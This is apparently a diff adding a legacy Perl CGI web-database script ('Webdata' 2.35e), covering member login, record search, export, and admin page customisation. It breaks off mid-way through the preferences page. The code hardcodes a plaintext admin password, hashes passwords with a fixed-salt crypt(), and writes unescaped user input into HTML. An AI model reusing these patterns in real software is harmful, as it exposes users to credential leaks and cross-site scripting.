@@ -1,0 +1,4235 @@
+#!/usr/bin/perl
+# version 2.35e
+#open(STDERR,">&STDOUT"); #Use to find cause of errors.
+
+#********* BEGIN BODY********************
+$uploadsdir='/usr/local/etc/httpd/sites/gamezportal.com/htdocs/eqr/uploads/'; #Must end with a /
+$uploadsURL='http://www.gamezportal.com/eqr/uploads/'; #Must end with a /
+$password="aolizer";
+
+$logdir=''; #Must end with a / or is empty if log files are local to script.
+
+$logfile="${logdir}ao_data.log";
+$fieldnames="${logdir}ao_fields.log";
+$members="${logdir}ao_members.log";
+$reportdata="${logdir}ao_report.log";
+$code='4094';
+$vendor="WT";
+
+&readparse; 
+if ($user_data{cgifunction} eq "exportset") {
+  print "Content-type: text/plain\n\n";
+} else {
+  print "Content-type: text/html\n\n";
+}
+if ((!(-e $logdir))&&(length($logdir)>0)) {&error("Could not find logs directory $logdir")};
+&getReportInfo;
+
+&user if ($user_data{cgifunction} eq "user");
+&add if ($user_data{cgifunction} =~/^(Add|Hinzufügen|Ajouter|Aggiungi|Agregar)$/);
+&adminsearch  if ($user_data{cgifunction} eq "Search/modify");
+&maintenance if ($user_data{cgifunction} eq "maintenance");
+&delete if $user_data{cgifunction} eq "delete";
+&modify if $user_data{cgifunction} eq "modify";
+&admin if $user_data{cgifunction} eq "admin";
+&usersearch if $user_data{cgifunction} =~/^(Search|Suchen|Chercher|Cerca|Buscar)$/;
+&import if $user_data{cgifunction} eq "Import data";
+&import2 if $user_data{cgifunction} eq "import2";
+&export if $user_data{cgifunction} eq "Export data";
+&export2 if $user_data{cgifunction} eq "export2";
+&cache if $user_data{cgifunction} eq "cache";
+&fieldmod if $user_data{cgifunction} eq "Modify fields";
+&deleteField if $user_data{cgifunction} eq "deleteField";
+&insertField if $user_data{cgifunction} eq "insertField";
+&renameField if $user_data{cgifunction} eq "renameField";
+&nextprev if $user_data{cgifunction} =~ /^(Next Page|Nächste Seite|Page suivante|Pagina Successiva|Página Siguiente)$/;
+&nextprev if $user_data{cgifunction} =~ /^(Previous Page|Vorherige Seite|Page précédente|Pagina Precedente|Página Anterior)$/;
+&members if $user_data{cgifunction} eq "Members";
+&addmember if $user_data{cgifunction} eq "Add Member";
+&deletemember if $user_data{cgifunction} eq "Delete Member";
+&memberpage if $user_data{cgifunction} eq "memberpage";
+&memberadd if $user_data{cgifunction} eq "add";
+&reportpage if $user_data{cgifunction} eq "Customize Pages";
+&modifyreport if $user_data{cgifunction} eq "Modify Pages";
+&deleteset if $user_data{cgifunction} eq "deleteset";
+&form if ($user_data{cgifunction} eq "form");
+&sqlform if ($user_data{cgifunction} eq "sqlform");
+&instantmember if ($user_data{cgifunction} eq "instantmember");
+&exportset if ($user_data{cgifunction} eq "exportset");
+&error('There is no value for cgifunction') if $user_data{cgifunction} eq "";
+
+sub error {
+  print "$_[0]<P>\n";
+  die "$_[0] $!";
+}
+
+
+#*****BEGIN INSTANTMEMBER SUBROUTINE
+sub instantmember {
+        &error("Instant Member disabled by admin") if $allowInstantMember!=1;
+        if ($user_data{username} eq "admin") {
+                print "<SCRIPT>alert(\'admin is a reserved name\')\;\n";
+                print "history.go(-1)\;</SCRIPT>";
+                exit;
+        };
+        &putlock;
+        open(FILE,"<$members");
+        @members=<FILE>;
+        close FILE;
+        &removelock;
+        foreach (@members) {
+                ($user,$pass)=split(/::/);
+                if ($user_data{username} eq $user) {
+                        print "<SCRIPT>\n";
+                        print "alert(\'That name is already used. Please choose another\')\n";
+   print "history.go(-1)\;";
+                        print "</SCRIPT>";
+                        exit;
+                };
+        };
+        $pass=crypt($user_data{password},7);
+        $line="$user_data{username}::$pass\n";
+        &putlock;
+        open(FILE,">>$members");
+                print FILE ("$line");
+        close FILE;
+        &removelock;
+ &memberpage;
+};
+#****END INSTANTMEMBER SUBROUTINE
+
+sub form {
+  if ($usersearch!=1) {
+    if ($membersCanSearch) {
+      &memberpass;
+    } else {
+      &checkpass;
+    };
+  };
+  
+  &language;
+  pop(@value);
+  $id=$user_data{fid};
+  
+  if ($formTemplateOn != 1) {
+    print "
+<HEAD><TITLE>FORM DATA</TITLE></HEAD>
+<BODY bgcolor=\"$reportColor\"";
+    if (length($background)>0) {print " BACKGROUND=\"$background\""};
+    print ">
+$reportHeader
+<TABLE width=100% bgcolor=white border=1>
+<TH WIDTH=20%></TH><TH></TH>
+  ";
+  };
+  open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+  @fieldsData=<FIELDS>;
+  close FIELDS;
+  foreach (@fieldsData) {
+    ($field,$type)=split(/::/);
+    push(@fields,"$field\n");
+    push(@types,"$type");
+  };
+  shift(@fields);
+  &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+  open(READLOG,"<$logfile") or &error("Could not open $logfile");
+  @entrydata = <READLOG>;
+  close READLOG;
+  &removelock; #remove lock file
+  foreach $entry (@entrydata) {
+    @parsed = split(/::/,$entry);
+    if ($parsed[0] eq $id) {@data = @parsed};
+  };
+  $num = @fields;
+  shift(@data);
+  if ($formTemplateOn != 1) {
+    for ($i=0;$i<$num;$i++) {
+      #    $data[$i]=~s/\"/'&quot;'/ge;
+      $data[$i]=~s/^([0-9a-zA-Z_\-\.\~]+\@[0-9a-zA-Z_\-\.\~]+\.[0-9a-zA-Z_\-\.\~]+)/<A HREF=mailto:$1>$1<\/A>/;
+      if ($data[$i]=~/^([^ ]+\.(gif|jpg))$/i) {
+	$data[$i]="<IMG SRC=$1>";
+      } else {
+	&gettype($types[$i+1]);
+	if ($type ne "upload") {
+	  $data[$i]=~s/^(http[^ ]+)/<A HREF=$1>$1<\/A>/;
+	} else {
+	  @filenameparts=split('_',$data[$i]);
+	  $filename=@filenameparts[$#filenameparts];
+	  $data[$i]=~s/^(http[^ \<\>]+)/<A HREF=$1>$filename<\/A>/g;	
+	}
+      };
+      if ($data[$i] eq "") {$data[$i]='&nbsp;'};
+      print "<TR><TD><B>$fields[$i]</B></TD><TD>$data[$i]</TD></TR>\n";
+    };
+    
+    print "</TABLE>";
+  };
+  &template if $formTemplateOn==1;
+  print "<P>
+<A HREF=\"$cgilocation?$user_data{query}\"><B>Back to Search Results</B></A> 
+\&nbsp\;
+" if length($user_data{query})>0;
+  if
+    ((length($user_data{cgilanguage})>0)&&($searchPage=~/cgifunction=user$/))
+      {
+	$searchPage.="\&language=$user_data{cgilanguage}";
+      }
+  print "\&nbsp\;\&nbsp\;<A HREF=\"$searchPage\"><B>$searchagain</B></A>\n" if $searchAgain;
+  print "\&nbsp\;\&nbsp\;<A HREF=\"$homepage\"><B>$returntohomepage</B></A>\n" if $returnToHomepage;
+print "<P><font size=-1><I>$poweredbywebteacher</I>";
+};
+
+#*******END FORM SUBROUTINE******
+
+#BEGIN TEMPLATE
+sub template {
+  $uploadcount=1;
+  @escape=();
+  foreach (@data) {
+    $tempescape=escape($_);
+    push(@escape,$tempescape);
+    if (!$templateNoSubstitute) {   
+      &gettype($types[$uploadcount]);
+      
+s/^([0-9a-zA-Z_\-\.\~]+\@[0-9a-zA-Z_\-\.\~]+\.[0-9a-zA-Z_\-\.\~]+)/<A
+HREF=mailto:$1>$1<\/A>/g;
+      if ($_!~/\.(gif|jpg)$/) {
+        if ($type eq "upload") { 
+          @filenameparts=split('_',$_);
+          $filename=@filenameparts[$#filenameparts];
+          $_=~s/^(http[^ \<\>]+)/<A HREF=$1>$filename<\/A>/g;
+        } else {
+          s/^(http[^ ]+)/<A HREF=$1>$1<\/A>/g;
+        };
+      };
+    s/^([^ ]+\.(gif|jpg))$/\<IMG SRC=$1\>/g;
+    $uploadcount++;
+  };
+};
+  $dateCreated=&getDate($id);
+  $formTemplate=~s/\$data\[([0-9]+)\]/$data[$1]/g;
+  $formTemplate=~s/\$escape\[([0-9]+)\]/$escape[$1]/g;
+  $formTemplate=~s/\$fields\[([0-9]+)\]/$fields[$1]/g;
+  $formTemplate=~s/\$id/$id/g;
+  $formTemplate=~s/\$datecreated/$dateCreated/g;
+  
+  print ($formTemplate);
+};
+#END TEMPLATE
+
+# URL-encode data
+sub escape {
+    shift() if ref($_[0]) || $_[0] eq $DefaultClass;
+    my $toencode = shift;
+    return undef unless defined($toencode);
+    $toencode=~s/([^a-zA-Z0-9_.-])/uc sprintf("%%%02x",ord($1))/eg;
+    $toencode=~s/\%20/\+/g; # spaces become pluses
+    return $toencode;
+}
+
+# unescape URL-encoded data
+sub unescape {
+    shift() if ref($_[0]);
+    my $todecode = shift;
+    return undef unless defined($todecode);
+    $todecode =~ tr/+/ /;       # pluses become spaces
+    $todecode =~ s/%([0-9a-fA-F]{2})/pack("c",hex($1))/ge;
+    return $todecode;
+}
+#******BEGIN DELETE SET SUBROUTINE*******
+sub deleteset {
+&memberpass;
+&putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+open(READLOG,"<$logfile") or &error("Could not open $logfile");
+@entries = <READLOG>;
+close READLOG;
+&removelock; #remove lock file
+foreach $line (@entries) {
+   @data=split(/::/,$line);
+	  $len=@data;
+	  $owner=$data[$len-1];
+	  chop($owner);
+	  $id=$_;
+	  if (($user_data{foundset}!~$data[0])||(($userid ne "admin")&&($userid ne $owner))) {
+      push(@result,$line);
+   } else {
+      $uploadpath="${uploadsdir}${data[0]}";
+      unlink <$uploadpath*>;
+   };
+};
+
+&putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+open(PUTLOG, ">$logfile") or &error("Content-type: text/html\n\n
+<BODY BGCOLOR=WHITE><CENTER><H2>Could not open the file $logfile<P>
+If you have moved the file, you can correct this by changing lines 10 and 11
+of the webdata_[database name].cgi script to show the absolute path to the file.<P><P><P></h2>
+This cgi error was ");
+print PUTLOG (@result);
+close PUTLOG;
+&removelock; #remove lock file
+
+@value=();
+if ($userid eq "admin") {&admin} else {&memberpage};
+};
+
+#******END DELETE SET SUBROUTINE*********
+
+#******BEGIN EXPORT SET SUBROUTINE ******
+sub exportset {
+  &memberpass;
+  &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+  open(READLOG,"<$logfile") or &error("Could not open $logfile");
+  @entries = <READLOG>;
+  close READLOG;
+  &removelock; #remove lock file
+  chomp(@entries);
+  if ($user_data{delimiter} eq "comma") {$delimiter=','} else {$delimiter="\t"};
+  foreach $line (@entries) {
+    $line=~s/,/\[COMMA\]/g if $delimiter eq ',';
+    @data=split(/::/,$line);
+    $len=@data;
+    $owner=$data[$len-1];
+    if ($user_data{foundset}=~/$data[0]/) {
+      $id=shift(@data);
+      $dateCreated=&getDate($id);
+      unshift(@data,$id,$dateCreated) if $user_data{includeID};
+      pop(@data) if !$user_data{includeID};
+      $newline=join($delimiter,@data);
+      push(@result,"$newline\n");
+    };
+  }; 
+  print (@result);
+}
+#******END EXPORT SET SUBROUTINE ********
+
+#******BEGIN MODIFY REPORT.LOG FILE*******
+sub modifyreport {
+&checkpass;
+open(FILE,">$reportdata") or &error("Could not open $reportdata");
+$user_data{header}=~s/\r\n/::/g;
+$user_data{header}=~s/\&lt\;/</g;
+$user_data{searchHeader}=~s/\r\n/::/g;
+$user_data{searchHeader}=~s/\&lt\;/</g;
+$user_data{reportFooter}=~s/\r\n/::/g;
+$user_data{reportFooter}=~s/\&lt\;/</g;
+$user_data{reportPageFooter}=~s/\r\n/::/g;
+$user_data{reportPageFooter}=~s/\&lt\;/</g;
+$user_data{searchTemplate}=~s/\r\n/::/g;
+$user_data{searchTemplate}=~s/\&lt\;/</g;
+$user_data{formTemplate}=~s/\r\n/::/g;
+$user_data{formTemplate}=~s/\&lt\;/</g;
+$user_data{maintenanceTemplate}=~s/\r\n/::/g;
+$user_data{maintenanceTemplate}=~s/\&lt\;/</g;
+$user_data{tableFont}=~s/\"/\&quot\;/g;
+if ($user_data{form} eq "on") {
+	$form=1;
+} else {
+	$form=0;
+};
+if ($user_data{searchTemplateOn} eq "on") {
+	$searchTemplateOn=1;
+} else {
+	$searchTemplateOn=0;
+};
+if ($user_data{formTemplateOn} eq "on") {
+	$formTemplateOn=1;
+} else {
+	$formTemplateOn=0;
+};
+if ($user_data{maintenanceTemplateOn} eq "on") {
+	$maintenanceTemplateOn=1;
+} else {
+	$maintenanceTemplateOn=0;
+};
+if ($user_data{allowInstantMember} eq "on") {
+ $allowInstantMember=1;
+} else {
+ $allowInstantMember=0;
+}
+if ($user_data{europeanDates} eq "on") {
+ $europeanDates=1;
+} else {
+ $europeanDates=0;
+}
+
+if ($user_data{disableFileLocking} eq "on") {
+ $disableFileLocking=1;
+} else {
+ $disableFileLocking=0;
+}
+
+if ($user_data{hideBorder} eq "on") {
+ $hideBorder=1;
+} else {
+ $hideBorder=0;
+}
+
+if ($user_data{usesql} eq "on") {
+ $usesql=1;
+} else {
+ $usesql=0;
+}
+
+if ($user_data{useradd} eq "on") {
+ $useradd=1;
+} else {
+ $useradd=0;
+}
+
+if ($user_data{usersearch} eq "on") {
+ $usersearch=1;
+} else {
+ $usersearch=0;
+}
+
+if ($user_data{membersCanSearch} eq "on") {
+  $membersCanSearch=1;
+} else {
+  $membersCanSearch=0;
+}
+
+if ($user_data{limitMemberSearch} eq "on") {
+  $limitMemberSearch=1;
+} else {
+  $limitMemberSearch=0;
+}
+
+
+
+if ($user_data{membersCanAdd} eq "on") {
+  $membersCanAdd=1;
+} else {
+  $membersCanAdd=0;
+}
+
+if ($user_data{limitMembers} eq "on") {
+  $limitMembers=1;
+} else {
+  $limitMembers=0;
+}
+
+if ($user_data{searchbox} eq "on") {
+  $searchbox=1;
+} else {
+  $searchbox=0;
+}
+
+if ($user_data{templateNoSubstitute} eq "on") {
+  $templateNoSubstitute=1;
+} else {
+  $templateNoSubstitute=0;
+}
+
+if ($user_data{showCriteria} eq "on") {
+  $showCriteria=1;
+} else {
+  $showCriteria=0;
+}   
+
+if ($user_data{gotoPage} eq "on") {
+  $gotoPage=1;
+} else {
+  $gotoPage=0;
+}   
+
+if ($user_data{nextprevButtons} eq "on") {
+  $nextprevButtons=1;
+} else {
+  $nextprevButtons=0;
+}   
+
+if ($user_data{searchAgain} eq "on") {
+  $searchAgain=1;
+} else {
+  $searchAgain=0;
+}   
+
+if ($user_data{returnToHomepage} eq "on") {
+  $returnToHomepage=1;
+} else {
+  $returnToHomepage=0;
+}   
+
+
+
+#required fields
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fieldsData=<FIELDS>;
+close FIELDS;
+@fields=();
+@types=();
+foreach (@fieldsData) {
+	($field,$type)=split(/::/);
+	push(@fields,"$field\n");
+	push(@types,"$type");
+};
+shift(@fields);
+chomp(@fields);
+$i=0;
+foreach (@fields) {
+  $fieldname=$_;
+  $fieldname=~s/ //g;
+  $boxname="${fieldname}_required";
+  if ($user_data{$boxname} eq "on") {
+    push (@requiredfields,$i);
+  }
+  $i++;
+}
+$reqfields=join(',',@requiredfields);
+
+#chop($user_data{seqnums});
+print FILE ("$user_data{color}\n$user_data{header}\n$user_data{seqnums}\n$user_data{sort}\n");
+print FILE ("$user_data{order}\n$user_data{numrows}\n$form\n");
+print FILE ("$user_data{searchHeader}\n$user_data{searchInfo}\n$user_data{viewButtonLabel}\n");
+print FILE ("$searchTemplateOn\n$user_data{searchTemplate}\n");
+print FILE ("$formTemplateOn\n$user_data{formTemplate}\n$user_data{searchPage}\n$user_data{limitAdminColumns}\n");
+print FILE ("$allowInstantMember\n$europeanDates\n$user_data{sort2}\n$user_data{order2}\n$user_data{reportFooter}\n");
+print FILE ("$user_data{headerColor}\n$user_data{rowColor1}\n$user_data{rowColor2}\n$user_data{formSeqnums}\n");
+print FILE ("$hideBorder\n$user_data{tableFont}\n$usesql\n$user_data{dsn}\n$user_data{tablename}\n");
+print FILE ("$user_data{primarykey}\n$useradd\n$usersearch\n$user_data{homepage}\n$user_data{memberpage}\n");
+print FILE ("$membersCanSearch\n$membersCanAdd\n$searchbox\n$user_data{background}\n$user_data{viewButtonImage}\n");
+print FILE ("$user_data{email}\n$user_data{sendmail}\n$user_data{language}\n$user_data{textcolor}\n$user_data{linkcolor}\n");
+print FILE ("$user_data{vlinkcolor}\n$reqfields\n$templateNoSubstitute\n$limitMembers\n$limitMemberSearch\n");
+print FILE ("$disableFileLocking\n$user_data{registereddb}\n$showCriteria\n$maintenanceTemplateOn\n");
+print FILE ("$user_data{maintenanceTemplate}\n$gotoPage\n$nextprevButtons\n$searchAgain\n$returnToHomepage\n");
+print FILE ("$user_data{reportPageFooter}\n");
+close FILE;
+&reportpage;
+};
+#******END MODIFY REPORT.LOG FILE*******
+
+sub getReportInfo{
+@reportData=();
+open(FILE,"<$reportdata") or &error("Could not open $reportdata");
+@reportData=<FILE>;
+close FILE;
+chomp(@reportData);
+
+$reportColor=$reportData[0];
+$reportHeader=$reportData[1];
+  $reportHeader=~s/::/\n/g;
+$reportSequence=$reportData[2];
+  @sequence=split(/:/,$reportSequence);
+$reportSort=$reportData[3];
+$reportOrder=$reportData[4];
+$reportLines=$reportData[5];
+  $reportLines=15 if $reportLines eq "";
+$reportForm=$reportData[6];
+$searchHeader=$reportData[7];
+  $searchHeader=~s/::/\n/g;
+$searchInfo=$reportData[8];
+$viewButtonLabel=$reportData[9];
+$searchTemplateOn=$reportData[10];
+$searchTemplate=$reportData[11];
+  $searchTemplate=~s/::/\n/g;
+$formTemplateOn=$reportData[12];
+$formTemplate=$reportData[13];
+  $formTemplate=~s/::/\n/g;
+$searchPage=$reportData[14];
+  $searchPageBox=$searchPage;
+  if (length($searchPage)==0) {$searchPage="${cgilocation}?cgifunction=user"};
+$limitAdminColumns=$reportData[15];
+$allowInstantMember=$reportData[16];
+$europeanDates=$reportData[17];
+$reportSort2=$reportData[18];
+$reportOrder2=$reportData[19];
+$reportFooter=$reportData[20];
+  $reportFooter=~s/::/\n/g;
+$headerColor=$reportData[21];
+$rowColor1=$reportData[22];
+$rowColor2=$reportData[23];
+$searchFormSequence=$reportData[24];
+  @SFsequence=split(':',$searchFormSequence);
+$hideBorder=$reportData[25];
+$tableFont=$reportData[26];
+$usesql=$reportData[27];
+$dsn=$reportData[28];
+$tablename=$reportData[29];
+$primarykey=$reportData[30];
+$useradd=$reportData[31];
+$usersearch=$reportData[32];
+$homepage=$reportData[33];
+$memberpage=$reportData[34];
+$membersCanSearch=$reportData[35];
+$membersCanAdd=$reportData[36];
+$searchbox=$reportData[37];
+$background=$reportData[38];
+$viewButtonImage=$reportData[39];
+$email=$reportData[40];
+$sendmail=$reportData[41];
+$language=$reportData[42];
+$textcolor=$reportData[43];
+$linkcolor=$reportData[44];
+$vlinkcolor=$reportData[45];
+$reqfields=$reportData[46];
+$templateNoSubstitute=$reportData[47];
+$limitMembers=$reportData[48];
+$limitMemberSearch=$reportData[49];
+$disableFileLocking=$reportData[50];
+$registereddb=$reportData[51];
+$showCriteria=$reportData[52];
+$maintenanceTemplateOn=$reportData[53];
+$maintenanceTemplate=$reportData[54];
+  $maintenanceTemplate=~s/::/\n/g;
+$gotoPage=$reportData[55];
+$nextprevButtons=$reportData[56];
+$searchAgain=$reportData[57];
+$returnToHomepage=$reportData[58];
+$reportPageFooter=$reportData[59];
+}
+
+#*******BEGIN REPORT PAGE SUBROUTINE********
+sub reportpage {
+&checkpass;
+&getReportInfo;
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fieldsData=<FIELDS>;
+close FIELDS;
+@fields=();
+@types=();
+foreach (@fieldsData) {
+	($field,$type)=split(/::/);
+	push(@fields,"$field\n");
+	push(@types,"$type");
+};
+shift(@fields);
+chomp(@fields);
+$len=@fields;
+
+  $reportHeader=~s/</\&lt\;/g;
+  $searchHeader=~s/</\&lt\;/g;
+  $searchTemplate=~s/</\&lt\;/g;
+  $formTemplate=~s/</\&lt\;/g;
+  $maintenanceTemplate=~s/</\&lt\;/g;
+print "
+<HEAD><TITLE>Webdata Preferences</TITLE>
+<SCRIPT>
+nav=navigator.userAgent\;
+if (nav.indexOf(\'MSIE 3\')>0) {IE3=true} else {IE3=false}\;
+
+function clearSequence (s,box) {
+	if (IE3) {
+	  alert(\"Sorry, MSIE 3 does not support dynamic lists. \\nYou must use MSIE 4+ or Netscape 3+ to use this function\")\;
+	} else {
+	  s.options.length=0\;
+	  box.value=\"\"\;
+	}\;
+}\;
+
+function setseq(L,R,box) {
+	if (IE3) {
+	  alert(\"Sorry, MSIE 3 does not support dynamic lists. \\nYou must use MSIE 4+ or Netscape 3+ to use this function\")\;
+	} else {
+	var len=R.options.length\;
+	R.options.length++\;
+	i=L.selectedIndex\;
+	R.options[len].text=L.options[i].text\;
+	R.options[len].value=i\;
+	setnums(R,box)\;
+	}
+}\;
+
+function setnums(s,boxname) {
+	var len=s.options.length\;
+	result=\"\"\;
+	for (i=0;i<len;i++) {
+		result+=s.options[i].value+\":\"
+	}\;
+	boxname.value=result\;
+}\;
+
+function loadScript() {
+  f=document.form1;
+  setnums(f.sequence,f.seqnums)\;
+  setnums(f.searchFormSequence,f.formSeqnums)\;  
+}
+</SCRIPT></HEAD>
+
+<BODY BGCOLOR=\"BEIGE\" onLoad=\"loadScript()\">
+<h3 align=center>Preferences for the user search page and search results</h3>
+<FORM NAME=\"form1\" ACTION=\"$cgilocation\" METHOD=POST>
+<table border=0 width=95\%>
+<tr><td align=right><INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Modify Pages\"></td></tr>
+<tr><td align=right><A HREF=\'$cgilocation?cgifunction=admin\'><B>Return to Administration Page</B></A></td></tr>
+<tr><td align=right><A HREF=\"$searchPage\"><B>Test your modifications on the User Search Page</B></A></td></tr>
+<tr><td align=right><A HREF=\"\#bottom\">Scroll to bottom of page</A></td></tr>
+</table>
+
+<B>Choose a language: </B>
+<SELECT NAME=\"language\" SIZE=1>
+<OPTION";
+  print " SELECTED" if $language eq "English";
+print ">English
+<OPTION";
+  print " SELECTED" if $language eq "German";
+print ">German
+<OPTION";  print " SELECTED" if $language eq "French";
+print ">French
+<OPTION";  print " SELECTED" if $language eq "Spanish";
+print ">Spanish
+<OPTION";  print " SELECTED" if $language eq "Italian";
+print ">Italian
+</SELECT><BR>
+<I>This changes the buttons and instructions on the user search page only.</I>
+<P>
+
+<B>Page Colors:</B><BR>
+Enter a standard color or hex triplet, and/or a background image.<BR>
+<i>This will apply to all 3 pages, the initial search page, the search results table, and the 'view button' form.</i><BR>
+<TABLE BORDER=0>
+<TR><TD ALIGN=RIGHT>\&lt\;BODY BGCOLOR=</TD>
+<TD>\"<INPUT TYPE=TEXT NAME=\"color\" VALUE=\"$reportColor\">\"</TD></TR>
+<TR><TD ALIGN=RIGHT>BACKGROUND=</TD>
+<TD>\"<INPUT TYPE=TEXT SIZE=40 NAME=\"background\" VALUE=\"$background\">\"</TD></TR>
+<TR><TD ALIGN=RIGHT>TEXT=<TD>\"<INPUT TYPE=TEXT SIZE=20 NAME=\"textcolor\" VALUE=\"$textcolor\">\"</TD></TR>
+<TR><TD ALIGN=RIGHT>LINK=<TD>\"<INPUT TYPE=TEXT SIZE=20 NAME=\"linkcolor\" VALUE=\"$linkcolor\">\"</TD></TR>
+<TR><TD ALIGN=RIGHT>VLINK=<TD>\"<INPUT TYPE=TEXT SIZE=20 NAME=\"vlinkcolor\" VALUE=\"$vlinkcolor\">\"\&gt\;</TD></TR>
+</TABLE>
+<HR>
+<P>
+<B>Header for search page:</B><BR>
+<I>This will go at the top of the search input form that users come to first.</I><BR>
+Enter any header text and/or images using HTML code:<BR>
+<TEXTAREA NAME=\"searchHeader\" COLS=60 ROWS=8 WRAP=VIRTUAL>$searchHeader</TEXTAREA><P>
+
+<B>Include default search instructions on Search Page?</B> 
+<INPUT TYPE=CHECKBOX NAME=searchInfo VALUE=1";
+if ($searchInfo==1) {print " CHECKED"};
+print ">
+<BR>
+<B>Allow visitors to ADD to the database?</B> 
+<INPUT TYPE=CHECKBOX NAME=useradd";
+if ($useradd==1) {print " CHECKED"};
+print ">
+<BR>
+<B>Allow visitors to SEARCH the database?</B> 
+<INPUT TYPE=CHECKBOX NAME=usersearch";
+if ($usersearch==1) {print " CHECKED"};
+print " onClick=\"if ((this.checked)&&(form.limitMemberSearch.checked)) {form.limitMemberSearch.checked=false\;alert(\'Restrict Member Searches has been turned off\')}\">
+<P>
+
+
+
+<B>Which fields should appear on the user search page:</B><BR>
+Click the fields in the left box in the sequence you wish <BR>
+to display them in the user search page.<BR>
+You may leave out fields which you wish to hide from users<BR>
+<table border=0 cellpadding=10><tr><th>Avaliable fields<th>Fields on search page</th><tr><td valign=top>
+<SELECT NAME=\"fields\" size=$len onChange=\"setseq(this,form.searchFormSequence,form.formSeqnums)\">";
+foreach (@fields) {print "<OPTION>$_\n";};
+print "
+</SELECT> <td valign=top><SELECT NAME=\"searchFormSequence\" size=$len>";
+
+@seq=split(/:/,$searchFormSequence);
+foreach (@seq) {
+	print "<OPTION VALUE=\'$_\'>$fields[$_]\n";
+};
+print "
+</SELECT>
+<tr><td><td valign=top>
+<input type=button value=\"Clear Sequence\" 
+onClick=\"clearSequence(form.searchFormSequence,form.formSeqnums)\"></td>
+
+</table></table>
+<P>
+<B>Use only a single search box for entire record.</B>
+<INPUT TYPE=\"CHECKBOX\" NAME=\"searchbox\"";
+print " CHECKED" if $searchbox==1;
+print ">
+<P>
+<B>Enter a URL for the \"Return to Homepage\" link.</B><BR>
+<INPUT TYPE=TEXT NAME=\"homepage\" size=60 value=\"$homepage\">
+<P>
+<B>If you would like use a customized search page:</B><BR> 
+<font size=2>1. Choose SAVE-AS on the default search page. Choose a name for the search page.<BR>
+2. If you use a cgi-bin, edit the ACTION in the &lt;FORM> tag to read \"/cgi-bin/$cgilocation\"<BR>
+3. Customize the saved file and upload it.<BR>
+4. Enter the name or URL of the new search page here.</font><BR>";
+$SearchPageBox=$searchPage;
+if ($searchPageBox eq "${cgilocation}?cgifunction=user") {$searchPageBox=""};
+print "
+<INPUT TYPE=text NAME=\"searchPage\" size=60 value=\"$searchPageBox\">
+<P>
+<B>If you would like to use a custom page for members:</B><BR>
+<font size=2>
+1. Choose SAVE-AS on the default members page which comes up after a member logs in.<BR>
+2. If you use a cgi-bin, edit the ACTION in the &lt;FORM&gt; tag to read \"/cgi-bin/$cgilocation\"<BR>
+3. Remove the first line which contains a script to set the cookie.<BR>
+4. Customize the saved file and upload it.<BR>
+5. Enter the name or URL of the new members page here.<P>
+ </FONT>
+
+<INPUT TYPE=TEXT NAME=\"memberpage\" size=60 value=\"$memberpage\"><BR>
+<B>Allow members to SEARCH the database?</B>
+<INPUT TYPE=CHECKBOX NAME=\"membersCanSearch\"";
+print " CHECKED" if $membersCanSearch==1;
+print " onClick=\"if (!this.checked) {form.limitMemberSearch.checked=false}\"><BR>
+\&nbsp\;\&nbsp\;<B>Restrict member searches to only their own records?</B>
+<INPUT TYPE=CHECKBOX NAME=\"limitMemberSearch\"";
+print " CHECKED" if $limitMemberSearch==1;
+print " onClick=\"if (this.checked) {lms(form)}\"><BR>
+<B>Allow members to ADD TO and MODIFY the database?</B>
+<INPUT TYPE=CHECKBOX NAME=\"membersCanAdd\"";
+print " CHECKED" if $membersCanAdd==1;
+print "><BR>
+\&nbsp\;\&nbsp\;<B>Limit members to 1 record each?</B>
+<INPUT TYPE=CHECKBOX NAME=\"limitMembers\"";
+print " CHECKED" if $limitMembers==1;
+print "><BR>
+<SCRIPT>
+function lms(f) {
+  f.membersCanSearch.checked=true\;
+  f.usersearch.checked=false\;
+  alert(\'Allow visitors to search is off.\\nAllow members to search is on.\')\;
+}
+</SCRIPT>
+<FONT SIZE=2><I>Note: You must use the members login page every time you wish to test a member feature so that
+the member cookie will replace the admin cookie.  Likewise, you must use the admin login page 
+again to reset the admin cookie before you return here or perform any other admin function.  </I></FONT>
+";
+
+#*********** BEGIN ODBC ********************
+#print "
+#<P><HR><P>
+#<B>Use an ODBC Database instead of Webdata's datafile.</B>
+#<INPUT TYPE=CHECKBOX NAME=\"usesql\"";
+#print " CHECKED" if $usesql==1;
+#print "><BR>
+#<I>You must have the Win32::ODBC module to use this option.</I><BR>
+#<B>DSN Name</B> <INPUT TYPE=TEXT SIZE=20 NAME=\"dsn\" VALUE=\"$dsn\"><BR>
+#<B>Table Name</B> <INPUT TYPE=TEXT SIZE=20 NAME=\"tablename\" VALUE=\"$tablename\"><BR>
+#<B>Primary Key</B> <SELECT NAME=\"primarykey\">\n";
+#$count=0;
+#foreach (@fields) {
+#  print "<OPTION VALUE=\"$count\"";
+#  print " SELECTED" if $count eq $primarykey;
+#  $count++;
+#  print ">$_";
+#}
+#print "\n</SELECT>
+#";
+#************ END ODBC **********************
+
+#************ BEGIN REQUIRED FIELDS *********
+print "<P><HR><P>\n";
+print "<B>Required Fields</B><BR>
+<I>The selected fields will be required on any page from which a record may be added.</I><BR>\n";
+$cols=0;
+$count=0;
+print "<TABLE BORDER=0>";
+foreach (@fields) {
+  $fieldname=$_;
+  $fieldname=~s/ //g; 
+  print "<TR>" if $cols==0;
+  print "<TD align=right><B>$_</B></TD>";
+  print "<TD><INPUT TYPE=CHECKBOX NAME=\"${fieldname}_required\"";
+    print " CHECKED" if $reqfields=~/(^|\,)$count($|\,)/;
+  print "></TD>\n";
+  $cols++;
+  if ($cols==5) {
+    $cols=0;
+    print "</TR>\n";
+  }
+  $count++;
+}
+print "</TABLE>";
+
+
+#************ END REQUIRED FIELDS ***********
+print "
+<P><HR><P>
+<B>Header for results page:</B><BR>
+<I>This will go at the top of the search results table.</I><BR>
+Enter any header text and/or images using HTML code:<BR>
+<TEXTAREA NAME=\"header\" COLS=60 ROWS=8 WRAP=VIRTUAL>$reportHeader</TEXTAREA><P>
+
+<B>Display Search Criteria:</B>
+<INPUT TYPE=CHECKBOX NAME=\"showCriteria\"";
+  print " CHECKED" if $showCriteria==1;
+print "><P>     
+
+<B>Hide Table Border:</B>
